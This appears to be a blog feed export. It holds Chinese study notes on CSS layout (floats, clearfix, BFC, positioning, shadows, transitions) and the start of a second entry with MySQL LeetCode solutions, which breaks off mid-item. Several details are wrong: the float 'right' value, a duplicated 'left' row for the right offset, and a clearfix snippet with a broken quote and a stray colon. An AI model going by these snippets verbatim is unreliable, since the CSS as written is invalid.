<h3 id="伪元素：："><a href="#伪元素：：" class="headerlink" title="伪元素：："></a>伪元素：：</h3><p>伪元素:一般页面中的非主体内容可以使用伪元素<br>区别:<br>1.元素:HTML设置的标签<br>2.伪元素:由 CSS 模拟出的标签效果<br>种类:</p>
<table>
<thead>
<tr>
<th>仿元素</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>::before</td>
<td>在父元素内容的是前添加一个的元素</td>
</tr>
<tr>
<td>::after</td>
<td>在父元素内容的曼后添加一个的元素</td>
</tr>
<tr>
<td>注意点:</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>必须设置content属性才能生效</li>
<li>伪元素默认是行内元素</li>
</ul>
<h3 id="标准流"><a href="#标准流" class="headerlink" title="标准流"></a>标准流</h3><p>标准流:又称文档流，是浏览器在渲染显示网页内容时默认采用的一套排版规则，规定了应该以何种方式排列元素<br>常见标准流排版规则:</p>
<ul>
<li>块级元素:从上往下，垂直布局，独占一行</li>
<li>行内元素 或 行内块元素:从左往右，水平布局，空间不够自动折行</li>
</ul>
<h3 id="浮动float"><a href="#浮动float" class="headerlink" title="浮动float"></a>浮动float</h3><p>属性名：float<br>属性值：left:左浮动 float:右浮动<br>注意：</p>
<ul>
<li>浮动元素会脱离标准流(简称:脱标)，在标准流中不占位置，相当于从地面飘到了空中</li>
<li>浮动元素比标准流高半个级别，可以覆盖标准流中的元素</li>
<li>浮动找浮动，下一个浮动元素会在上一个浮动元素后面左右浮动</li>
<li>浮动元素会受到上面元素边界的影响</li>
<li>浮动元素有特殊的显示效果<ul>
<li>一行可以显示多个</li>
<li>可以设置宽高</li>
</ul>
</li>
<li>浮动的元素不能通过text-align:center或者margin:0 auto，让浮动元素本身水平居中</li>
</ul>
<h3 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h3><p>含义:清除浮动带来的影响<br>影响:如果子元素浮动了，此时子元素不能撑开标准流的块圾父元素<br>原因:子元素浮动后脱标 一 不占位置<br>目的:需要父元素有高度，从而不影响其他网页元素的布局<br>清除浮动的方法 </p>
<ol>
<li>直接设置父元素高度<br> 优点:简单组暴，方便<br> 缺点:有些布局中不能团定父元素高度。如:新闻列表、京东推荐模块</li>
<li>额外标签法<br> 操作:<ol>
<li>在父元素内容的最后添加一个块级元素</li>
<li>给添加的块级元素设置 clear:both<br> 缺点:会在更面中添加额外的标签。会让更面的HTML结构变得复杂</li>
</ol>
</li>
<li>单伪元素清除法<br> 操作:用伪元素替代了额外标签<br> 示例： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.clearfix::after</span><br><span class="line">&#123;</span><br><span class="line">content:&quot;&#x27;;</span><br><span class="line">display:block:</span><br><span class="line">clear:both;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 优点:项目中使用，直接给标签加类即可清除浮动</li>
<li>给父元素设置overflow:hidden<br> 优点:方便</li>
</ol>
<p>补充：块格式化上下文(BlockFormatting Context)BFC的介绍<br>BFC是Web页面的可视CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。<br>创建BFC方法:</p>
<ol>
<li>html标签是BFC盒子</li>
<li>浮动元素是BFC盒子</li>
<li>行内块元素是BFC盒子</li>
<li>overflow属性取值不为visible.如:auto、hidden..</li>
</ol>
<p>BFC盒子常见特点:</p>
<ul>
<li>BFC盒子会默认包事住内部子元素(标准流、浮动)一应用:清除浮动</li>
<li>BFC盒子本身与子元素之间不存在margin的塌陷现象一应用:解决margin的塌陷</li>
</ul>
<h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><p><strong>应用场景</strong><br>可以让元素自由的摆放在网页的任意位置,一般用于盒子之间的展叠情况定，解决盒子与盒子之问的层叠问题-&gt;定位之后元素层级最高，可以层叠在其他盒子上。可以让盒子始终固定在屏幕中的某个位置。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240523001607.png"></p>
<p>常见布局方式：<br>标准流：块级元素独占一行，行内、行内块元素一行多个<br>浮动：让原本垂直布局的块元素变成水平布局<br>定位：让元素自由摆放在网页的任意位置，常用于盒子层叠的情况</p>
<p><strong>基本使用</strong></p>
<ol>
<li>设置定位方式<br>属性名：position<br>常用属性值：<table>
<thead>
<tr>
<th>定位方式</th>
<th>属性值</th>
</tr>
</thead>
<tbody><tr>
<td>静态</td>
<td>static</td>
</tr>
<tr>
<td>相对</td>
<td>relative</td>
</tr>
<tr>
<td>绝对</td>
<td>absolute</td>
</tr>
<tr>
<td>固定</td>
<td>fixed</td>
</tr>
</tbody></table>
</li>
<li>设置偏移<br>偏移水平和垂直方向各选一个，一般采用就近原则:<table>
<thead>
<tr>
<th>方向</th>
<th>属性名</th>
<th>属性值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>水平</td>
<td>left</td>
<td>数字+px</td>
<td>距离左边的距离</td>
</tr>
<tr>
<td>水平</td>
<td>left</td>
<td>数字+px</td>
<td>距离右边的距离</td>
</tr>
<tr>
<td>垂直</td>
<td>top</td>
<td>数字+px</td>
<td>距离上边的距离</td>
</tr>
<tr>
<td>垂直</td>
<td>bottom</td>
<td>数字+px</td>
<td>距离下边的距离</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="静态定位static"><a href="#静态定位static" class="headerlink" title="静态定位static"></a>静态定位static</h3><p>默认情况下就是静态定位，即之前的标准流，不做介绍</p>
<h3 id="相对定位relative"><a href="#相对定位relative" class="headerlink" title="相对定位relative"></a>相对定位relative</h3><p>说明：相对自己之前的位置移动<br>特点：</p>
<ul>
<li>需要配合方位属性实现移动</li>
<li>相对自己原来的位置进行移动</li>
<li>在页面中占位置（没有脱离标准流）</li>
</ul>
<p>应用：</p>
<ul>
<li>配合绝对定位实现子绝对父相对，对网页布局影响最小</li>
<li>用于小范围移动</li>
</ul>
<h3 id="绝对定位：默认相对浏览器可视区域的移动absolute"><a href="#绝对定位：默认相对浏览器可视区域的移动absolute" class="headerlink" title="绝对定位：默认相对浏览器可视区域的移动absolute"></a>绝对定位：默认相对浏览器可视区域的移动absolute</h3><p>说明：相对非静态定位的父元素(祖先)进行定位移动<br>特点：</p>
<ul>
<li>需要配合方位属性实现移动</li>
<li>默认相对浏览器可视区域移动</li>
<li>在页面中不占位置（已经脱离标准流）</li>
</ul>
<p>（祖先包括父代）只要祖先有position属性即使没有left,right等属性也可以，祖先没有则相对浏览器可视区域</p>
<h3 id="固定定位fixed"><a href="#固定定位fixed" class="headerlink" title="固定定位fixed"></a>固定定位fixed</h3><p>说明：相对浏览器进行定位移动<br>特点：</p>
<ul>
<li>需要配合方位属性实现移动</li>
<li>相对浏览器可视区域移动</li>
<li>在页面中不占位置（已经脱离标准流）</li>
</ul>
<p>应用：让盒子固定在屏幕某个位置</p>
<h3 id="元素的层级关系及其更改方法z-index"><a href="#元素的层级关系及其更改方法z-index" class="headerlink" title="元素的层级关系及其更改方法z-index"></a>元素的层级关系及其更改方法z-index</h3><p>标准流&lt;浮动&lt;定位（三种定位方式层级一样，html最下方的在最上层）<br>用于更改定位元素的层级，属性名为z-index，属性值为数字</p>
<h2 id="装饰"><a href="#装饰" class="headerlink" title="装饰"></a>装饰</h2><p>基浏览器文字类型元素排版中存在用于对齐的基线，当图片与文字在同一行显示时底部不是对齐的，以下是解决方法</p>
<h3 id="垂直对齐方式vertical-align"><a href="#垂直对齐方式vertical-align" class="headerlink" title="垂直对齐方式vertical-align"></a>垂直对齐方式vertical-align</h3><table>
<thead>
<tr>
<th>属性值</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td>baseline</td>
<td>默认，基线对齐</td>
</tr>
<tr>
<td>top</td>
<td>顶部对齐</td>
</tr>
<tr>
<td>middle</td>
<td>中部对齐</td>
</tr>
<tr>
<td>bottom</td>
<td>底部对齐</td>
</tr>
</tbody></table>
<p>通过此属性，可以解决以下问题：</p>
<ul>
<li>文本框与表单按钮无法对齐</li>
<li>input和img无法对齐</li>
<li>div中文本框无法贴顶</li>
<li>div不设高度由Img标签撑开使存在额外间隙</li>
<li>使用line-height让img标签垂直居中</li>
</ul>
<h3 id="光标效果cursor"><a href="#光标效果cursor" class="headerlink" title="光标效果cursor"></a>光标效果cursor</h3><p>场景:设置鼠标光标在元索上时显示的样式<br>属性名:cursor<br>常见属性值:</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td>default</td>
<td>默认，通常是箭头</td>
</tr>
<tr>
<td>pointer</td>
<td>小手效果，提示用户可以点击</td>
</tr>
<tr>
<td>text</td>
<td>I字型，提示用户可以选择文字</td>
</tr>
<tr>
<td>move</td>
<td>十字光标，提示用户可以移动</td>
</tr>
</tbody></table>
<h3 id="边框圆角border-radius"><a href="#边框圆角border-radius" class="headerlink" title="边框圆角border-radius"></a>边框圆角border-radius</h3><p>应用：可以让盒子四个角变得圆润，可以用于绘制圆形，胶囊形等，<br>增加页面细节，提高用户体验<br>属性名：border-radius<br>属性值：数字+px、百分比<br>原理：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240527165923.png"><br>赋值规则：从左上角开始赋值，顺时针赋值，没有赋值的看对角</p>
<h3 id="溢出部分效果（超过盒子大小的内容如何显示）overflow"><a href="#溢出部分效果（超过盒子大小的内容如何显示）overflow" class="headerlink" title="溢出部分效果（超过盒子大小的内容如何显示）overflow"></a>溢出部分效果（超过盒子大小的内容如何显示）overflow</h3><p>应用：控制盒子内容部分所超出盒子范围的区域（溢出部分）的显示效果。如显示、隐藏、滚动条<br>属性名：Overflow<br>属性值：</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td>visible</td>
<td>默认值，溢出部分可见</td>
</tr>
<tr>
<td>hidden</td>
<td>溢出部分隐藏</td>
</tr>
<tr>
<td>scroll</td>
<td>无论是否溢出，都显示滚动条</td>
</tr>
<tr>
<td>auto</td>
<td>根据是否溢出，自动显示会隐藏滚动条</td>
</tr>
</tbody></table>
<h3 id="元素隐藏"><a href="#元素隐藏" class="headerlink" title="元素隐藏"></a>元素隐藏</h3><p>可以实现鼠标停留才显示的效果，结合伪类选择器<br>应用:让元素本身在屏幕中不可见。<br>常见属性：</p>
<ol>
<li>visibility:hidden 隐藏元素本身，并且在网页中占位置</li>
<li>display:none 隐藏元素本身，并且在网页中不占位置</li>
</ol>
<h3 id="元素透明度和边框合并"><a href="#元素透明度和边框合并" class="headerlink" title="元素透明度和边框合并"></a>元素透明度和边框合并</h3><p><strong>透明度</strong><br>应用：让某元素整体（包括内容）一起变透明<br>属性名：opacity<br>属性值：0~1之间的数字，数字越高透明度越低<br><strong>边框合并</strong><br>应用：让相邻表格边框进行合并，得到细线边框效果<br>代码：border-collapse:collapse;</p>
<h3 id="链接、焦点、属性选择器"><a href="#链接、焦点、属性选择器" class="headerlink" title="链接、焦点、属性选择器"></a>链接、焦点、属性选择器</h3><p><strong>链接伪类选择器</strong><br>应用：常用于选中超链接的不同状态<br>语法:</p>
<table>
<thead>
<tr>
<th>选择器</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>a:link{}</td>
<td>选中a链接未访问过的状态</td>
</tr>
<tr>
<td>a:visited{}</td>
<td>选中a链接访问后的状态</td>
</tr>
<tr>
<td>a:hover{}</td>
<td>选中鼠标悬停的状态</td>
</tr>
<tr>
<td>a:active{}</td>
<td>选中鼠标按下的状态</td>
</tr>
</tbody></table>
<p>同时使用上述选择器时，按照LVHA的顺序书写</p>
<p><strong>属性选择器</strong><br>应用：通过元素上的html属性选中元素，常用于input标签<br>语法：</p>
<table>
<thead>
<tr>
<th>选择器</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>E[attr]</td>
<td>选中具有attr属性的E元素</td>
</tr>
<tr>
<td>E[attr&#x3D;”val”]</td>
<td>选中具有attr属性并且属性值等于val的E元素</td>
</tr>
</tbody></table>
<p><strong>焦点选择器</strong><br>应用：选中元素获取焦点时的状态，常用于表单控件<br>语法：input:focus{}</p>
<h3 id="背景图片大小background-size及背景的连写形式"><a href="#背景图片大小background-size及背景的连写形式" class="headerlink" title="背景图片大小background-size及背景的连写形式"></a>背景图片大小background-size及背景的连写形式</h3><p>作用:设置背景图片的大小，<br>语法:background-size:宽度 高度;<br>取值:</p>
<table>
<thead>
<tr>
<th>取值</th>
<th>场景</th>
</tr>
</thead>
<tbody><tr>
<td>数字+px</td>
<td>简单方便，常用</td>
</tr>
<tr>
<td>百分比</td>
<td>相对于当前盒子自身的宽高百分比</td>
</tr>
<tr>
<td>contain</td>
<td>包含，将背景图片等比例缩放，直到不会超出盒子的最大</td>
</tr>
<tr>
<td>cover</td>
<td>覆盖，将背景图片等比例缩放，直到刚好填满整个盒子没有空白</td>
</tr>
</tbody></table>
<h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><p><strong>文字阴影text-shadow</strong><br>作用:给文字添加阴影效果，吸引用户注意<br>属性名:text-shadow<br>取值:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>h-shadow</td>
<td>必须，水平偏移量。允许负值</td>
</tr>
<tr>
<td>v-shadow</td>
<td>必须，垂直偏移量，允许负值</td>
</tr>
<tr>
<td>blur</td>
<td>可选，模糊度</td>
</tr>
<tr>
<td>color</td>
<td>可选，阴影颜色</td>
</tr>
</tbody></table>
<p>拓展:<br>阴影可以叠加设置，每组阴影取值之间以逗号隔开</p>
<p><strong>盒子阴影box-shadow</strong><br>作用:给盒子添加阴影效果，吸引用户注意，体现页面的制作细节<br>属性名:box-shadow<br>取值:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>h-shadow</td>
<td>必须，水平偏移量。允许负值</td>
</tr>
<tr>
<td>v-shadow</td>
<td>必须，垂直偏移量。允许负值</td>
</tr>
<tr>
<td>blur</td>
<td>可选，模糊度</td>
</tr>
<tr>
<td>spread</td>
<td>可选，阴影扩大</td>
</tr>
<tr>
<td>color</td>
<td>可选，阴影颜色</td>
</tr>
<tr>
<td>inset</td>
<td>可选，将阴影改为内部阴影</td>
</tr>
</tbody></table>
<h3 id="过渡transition"><a href="#过渡transition" class="headerlink" title="过渡transition"></a>过渡transition</h3><p>作用:让元素的样式慢慢的变化，常配合hover使用，增强网页交互体验<br>属性名:transition<br>常见取值:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>取值</th>
</tr>
</thead>
<tbody><tr>
<td>过渡的属性</td>
<td>a11:所有能过渡的屈性都过渡、具体属性名如:width:只有width有过渡</td>
</tr>
<tr>
<td>过渡的时长</td>
<td>数字+s(秒)</td>
</tr>
</tbody></table>
<p>注意点:</p>
<ol>
<li>过渡需要:默认状态 和 hover状态样式不同，才能有过渡效果</li>
<li>transition属性给需要过渡的元素本身加</li>
<li>transition属性设置在不同状态中，效果不同的<ol>
<li>给默认状态设置，鼠标移入移出都有过渡效果</li>
<li>给hover状态设置，鼠标移入有过渡效果，移出没有</li>
</ol>
</li>
</ol>
<h2 id="项目知识补充"><a href="#项目知识补充" class="headerlink" title="项目知识补充"></a>项目知识补充</h2><h3 id="html代码详解"><a href="#html代码详解" class="headerlink" title="html代码详解"></a>html代码详解</h3><p>标识网页使用的语言<br><code>&lt;html lang=&quot;en&quot; </code><br>作用:搜索引擎归类 +浏览器翻译<br>常见语言:zh-CN 简体中文&#x2F;en 英文</p>
<p>标识网页使用的字符编码<br><code>&lt;meta charset=&quot;UTF-8&quot;</code><br>作用:保存和打开的字符编码需要统一设置，否则可能会出现乱码<br>常见字符编码:</p>
<ol>
<li>UTF-8:万国码，国际化的字符编码，收录了全球语言的文字</li>
<li>GB2312:6000+汉字</li>
<li>GBK:20000+汉字<br>注意点:开发中统一使用UTF-8 字符编码即可</li>
</ol>
<h3 id="搜索引擎优化SEO"><a href="#搜索引擎优化SEO" class="headerlink" title="搜索引擎优化SEO"></a>搜索引擎优化SEO</h3><p>SE0(Search Engine Optimization):搜索引擎优化<br>作用:让网站在搜索引擎上的排名靠前<br>提升SEO的常见方法:</p>
<ol>
<li>竟价排名</li>
<li>将网页制作成html后缀</li>
</ol>
<p><strong>SEO三大标签</strong><br>1.title:网页标题标签<br>2.description:网页描述标签<br>3.keywords:网页关键词标签</p>
<h3 id="有语义的布局标签"><a href="#有语义的布局标签" class="headerlink" title="有语义的布局标签"></a>有语义的布局标签</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240601214725.png"></p>
<h3 id="ico图标"><a href="#ico图标" class="headerlink" title="ico图标"></a>ico图标</h3><p>显示在标签页标题左侧的小图标，常使用.ico格式的图标<br>常见代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;shortcut ico&quot; href=&quot;ico图标路径&quot; type=&quot;image/x-icon&quot;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="版心（将主要内容约束到中间）"><a href="#版心（将主要内容约束到中间）" class="headerlink" title="版心（将主要内容约束到中间）"></a>版心（将主要内容约束到中间）</h3><p>场景:把页面的主体内容约束在网页中间<br>作用:让不同大小的屏幕都能看到页面的主体内容<br>代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">container &#123;</span><br><span class="line">width: 1240px;</span><br><span class="line">margin: 0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意点:版心类名常用container wrapper w等</p>
<h3 id="css书写顺序规范"><a href="#css书写顺序规范" class="headerlink" title="css书写顺序规范"></a>css书写顺序规范</h3><p>衡量程序员的能力，除了要看实现业务需求的能力，还要看平时书写代码的规范(专业性)<br>不同的CSS书写顺序会影响浏览器的渲染性能，推荐前端工程师使用专业的书写顺序习惯</p>
<table>
<thead>
<tr>
<th>顺序</th>
<th>类别</th>
<th>属性</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>布局属性</td>
<td>display position float clear visibility overflow</td>
</tr>
<tr>
<td>2</td>
<td>盒子模型+背景</td>
<td>width height margin padding border background</td>
</tr>
<tr>
<td>3</td>
<td>文本内容属性</td>
<td>color font text-decoration text-align line-height</td>
</tr>
<tr>
<td>4</td>
<td>点缀属性</td>
<td>cursor border-radius text-shadow box-shadow</td>
</tr>
</tbody></table>
<p>注意点:<br>开发中推荐多用类+后代，但不是层级越多越好，一个选择器中的类选择器的个数推荐 不要超过3个</p>
<h3 id="项目开发注意"><a href="#项目开发注意" class="headerlink" title="项目开发注意"></a>项目开发注意</h3><p>一般项目开始前，首先会 去除掉浏览器默认样式，设置为当前项目需要的初始化样式<br><em>去除常见标签默认的 margin 和 padding</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body,h1,h2,h3,h4,h5,h6,</span><br><span class="line">p,ul,ol,li,dl,dt,dd,input</span><br><span class="line">&#123;margin:0;padding:0;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端技术</category>
        <category>语言</category>
      </categories>
      <tags>
        <tag>HTML&amp;CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-Challenges</title>
    <url>/2024/09/26/MySQL-Challenges/</url>
    <content><![CDATA[<p>题目来自</p>
<p><a href="https://leetcode.cn/studyplan/sql-free-50/">高频 SQL 50 题（基础版）</a></p>
<h2 id="错题"><a href="#错题" class="headerlink" title="错题"></a>错题</h2><h3 id="（1）让查询为空的查询结果显示为null"><a href="#（1）让查询为空的查询结果显示为null" class="headerlink" title="（1）让查询为空的查询结果显示为null"></a>（1）让查询为空的查询结果显示为null</h3><p><a href="https://leetcode.cn/problems/second-highest-salary/">176. 第二高的薪水</a></p>
<p>方法：</p>
<pre><code> 1. 在外层包裹一个select，即可实现结果为空时显示null
 2. 使用ifnull(expr,null)
</code></pre>
<p>题解：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(</span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">    	<span class="keyword">distinct</span> salary </span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    Employee</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">    salary <span class="keyword">desc</span></span><br><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span></span><br><span class="line">) <span class="keyword">as</span> SecondHighestSalary</span><br></pre></td></tr></table></figure>





<h3 id="（2）-日期函数-查询近n天的数据"><a href="#（2）-日期函数-查询近n天的数据" class="headerlink" title="（2）[日期函数] 查询近n天的数据"></a>（2）[日期函数] 查询近n天的数据</h3><p><a href="https://leetcode.cn/problems/user-activity-for-the-past-30-days-i/">题目</a></p>
<p><strong>重点：</strong></p>
<p>DATEDIFF( ‘2019-07-27’,activity_date) &lt; 30 截至 <code>2019-07-27</code>（包含2019-07-27），近 <code>30</code> 天，因为此函数的返回值可能为负数。</p>
<p>题解：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select</span><br><span class="line">    activity_date as day,</span><br><span class="line">    count(distinct user_id) as active_users</span><br><span class="line">from </span><br><span class="line">    Activity</span><br><span class="line">where </span><br><span class="line">    Datediff(&quot;2019-07-27&quot;,activity_date) between 0 and 29</span><br><span class="line">group by </span><br><span class="line">    day</span><br></pre></td></tr></table></figure>



<h3 id="（3）-子查询-各部门前n高的成员"><a href="#（3）-子查询-各部门前n高的成员" class="headerlink" title="（3）[子查询] 各部门前n高的成员"></a>（3）[子查询] 各部门前n高的成员</h3><p><a href="https://leetcode.cn/problems/department-top-three-salaries/">185. 部门工资前三高的所有员工</a></p>
<p>【重点】</p>
<p>​	<strong>相关子查询（correlated subquery）</strong></p>
<p>子查询依赖于外部查询的某些值，每次执行子查询时，它都会根据外部查询的当前行重新计算结果</p>
<p>【题解】</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    d.Name <span class="keyword">AS</span> <span class="string">&#x27;Department&#x27;</span>, e1.Name <span class="keyword">AS</span> <span class="string">&#x27;Employee&#x27;</span>, e1.Salary</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    Employee e1</span><br><span class="line">        <span class="keyword">JOIN</span></span><br><span class="line">    Department d <span class="keyword">ON</span> e1.DepartmentId <span class="operator">=</span> d.Id</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    <span class="number">3</span> <span class="operator">&gt;</span> (<span class="keyword">SELECT</span></span><br><span class="line">            <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> e2.Salary)</span><br><span class="line">        <span class="keyword">FROM</span></span><br><span class="line">            Employee e2</span><br><span class="line">        <span class="keyword">WHERE</span></span><br><span class="line">            e2.Salary <span class="operator">&gt;</span> e1.Salary</span><br><span class="line">                <span class="keyword">AND</span> e1.DepartmentId <span class="operator">=</span> e2.DepartmentId</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>



<h3 id="（4）-单表自连接-查询连续n个符合要求的数据"><a href="#（4）-单表自连接-查询连续n个符合要求的数据" class="headerlink" title="（4）[单表自连接] 查询连续n个符合要求的数据"></a>（4）[单表自连接] 查询连续n个符合要求的数据</h3><p><a href="https://leetcode.cn/problems/human-traffic-of-stadium/">601. 体育馆的人流量</a></p>
<p>找出每行的人数大于或等于 <code>100</code> 且 <code>id</code> 连续的三行或更多行记录。</p>
<p>单表自连接并通过其他n个表来得到连续n个</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> t1.<span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> stadium t1, stadium t2, stadium t3</span><br><span class="line"><span class="keyword">where</span> t1.people <span class="operator">&gt;=</span> <span class="number">100</span> <span class="keyword">and</span> t2.people <span class="operator">&gt;=</span> <span class="number">100</span> <span class="keyword">and</span> t3.people <span class="operator">&gt;=</span> <span class="number">100</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">(</span><br><span class="line">	  (t1.id <span class="operator">-</span> t2.id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> t1.id <span class="operator">-</span> t3.id <span class="operator">=</span> <span class="number">2</span> <span class="keyword">and</span> t2.id <span class="operator">-</span> t3.id <span class="operator">=</span><span class="number">1</span>)  <span class="comment">-- t1, t2, t3</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    (t2.id <span class="operator">-</span> t1.id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> t2.id <span class="operator">-</span> t3.id <span class="operator">=</span> <span class="number">2</span> <span class="keyword">and</span> t1.id <span class="operator">-</span> t3.id <span class="operator">=</span><span class="number">1</span>) <span class="comment">-- t2, t1, t3</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    (t3.id <span class="operator">-</span> t2.id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> t2.id <span class="operator">-</span> t1.id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> t3.id <span class="operator">-</span> t1.id <span class="operator">=</span> <span class="number">2</span>) <span class="comment">-- t3, t2, t1</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> t1.id</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h3 id="（5）-联合查询-流程控制-根据某列特征划分数据产生新列"><a href="#（5）-联合查询-流程控制-根据某列特征划分数据产生新列" class="headerlink" title="（5）[联合查询&#x2F;流程控制] 根据某列特征划分数据产生新列"></a>（5）[联合查询&#x2F;流程控制] 根据某列特征划分数据产生新列</h3><p><a href="https://leetcode.cn/problems/tree-node/">608. 树节点</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 联合</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    id, <span class="string">&#x27;Root&#x27;</span> <span class="keyword">AS</span> Type</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    tree</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    p_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    id, <span class="string">&#x27;Leaf&#x27;</span> <span class="keyword">AS</span> Type</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    tree</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    id <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">            p_id</span><br><span class="line">        <span class="keyword">FROM</span></span><br><span class="line">            tree</span><br><span class="line">        <span class="keyword">WHERE</span></span><br><span class="line">            p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">        <span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    id, <span class="string">&#x27;Inner&#x27;</span> <span class="keyword">AS</span> Type</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    tree</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    id <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">            p_id</span><br><span class="line">        <span class="keyword">FROM</span></span><br><span class="line">            tree</span><br><span class="line">        <span class="keyword">WHERE</span></span><br><span class="line">            p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">        <span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 流程控制</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    id <span class="keyword">AS</span> `Id`,</span><br><span class="line">    <span class="keyword">CASE</span></span><br><span class="line">        <span class="keyword">WHEN</span> tree.id <span class="operator">=</span> (<span class="keyword">SELECT</span> atree.id <span class="keyword">FROM</span> tree atree <span class="keyword">WHERE</span> atree.p_id <span class="keyword">IS</span> <span class="keyword">NULL</span>)</span><br><span class="line">          <span class="keyword">THEN</span> <span class="string">&#x27;Root&#x27;</span></span><br><span class="line">        <span class="keyword">WHEN</span> tree.id <span class="keyword">IN</span> (<span class="keyword">SELECT</span> atree.p_id <span class="keyword">FROM</span> tree atree)</span><br><span class="line">          <span class="keyword">THEN</span> <span class="string">&#x27;Inner&#x27;</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">&#x27;Leaf&#x27;</span></span><br><span class="line">    <span class="keyword">END</span> <span class="keyword">AS</span> Type</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    tree</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> `Id`</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h3 id="（6）插入数据-如果数据已经存在，忽略"><a href="#（6）插入数据-如果数据已经存在，忽略" class="headerlink" title="（6）插入数据,如果数据已经存在，忽略"></a>（6）插入数据,如果数据已经存在，忽略</h3><p>使用ignore关键字：</p>
